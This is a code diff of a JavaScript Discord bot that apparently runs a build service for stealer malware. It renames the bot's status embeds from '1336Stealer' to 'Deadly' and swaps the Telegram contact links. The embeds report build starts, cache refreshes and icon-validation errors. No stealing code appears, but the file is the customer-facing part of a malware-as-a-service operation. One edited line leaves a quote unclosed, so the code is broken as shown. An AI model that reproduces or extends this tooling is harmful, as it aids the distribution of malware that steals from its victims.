@@ -29,19 +29,19 @@ function sleep(ms) {
 
 const refresh = new EmbedBuilder()
     .setColor(0x000000)
-    .setTitle('1336Stealer')
-    .setURL('https://t.me/St34ler')
+    .setTitle('Deadly')
+    .setURL('https://t.me/deadly_08')
     .setDescription('Successfully refresh the cache!')
     .setTimestamp()
-    .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });
+    .setFooter({ text: '@Deadly', iconURL: 'none' });
 
 const buildstarted = new EmbedBuilder()
     .setColor(0x000000)
-    .setTitle('1336Stealer')
-    .setURL('https://t.me/St34ler')
+    .setTitle('Deadly')
+    .setURL('https://t.me/deadly_08)
     .setDescription('Started ur build... ETA: 1m')
     .setTimestamp()
-    .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });
+    .setFooter({ text: 'Deadly', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });
 
 const invalidicodetected = new EmbedBuilder()
     .setColor(0x000000)
@@ -53,11 +53,11 @@ const invalidicodetected = new EmbedBuilder()
 
 const invalidicodetected2 = new EmbedBuilder()
     .setColor(0x000000)
-    .setTitle('1336Stealer')
-    .setURL('https://t.me/St34ler')
+    .setTitle('Deadly')
+    .setURL('https://t.me/deadly')
     .addFields({ name: 'ERROR: Invalid .ico detected, build process aborted.', value: '*Please retry with 64x64 ico file, if not work, contact an admin.*', inline: true })
     .setTimestamp()
-    .setFooter({ text: '@1336Stealer', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });
+    .setFooter({ text: 'Deadly', iconURL: 'https://cdn.discordapp.com/attachments/1056927381333475369/1057369902555598938/1336.gif' });
 
 const noverifiedrole = new EmbedBuilder()
     .setColor(0x000000)
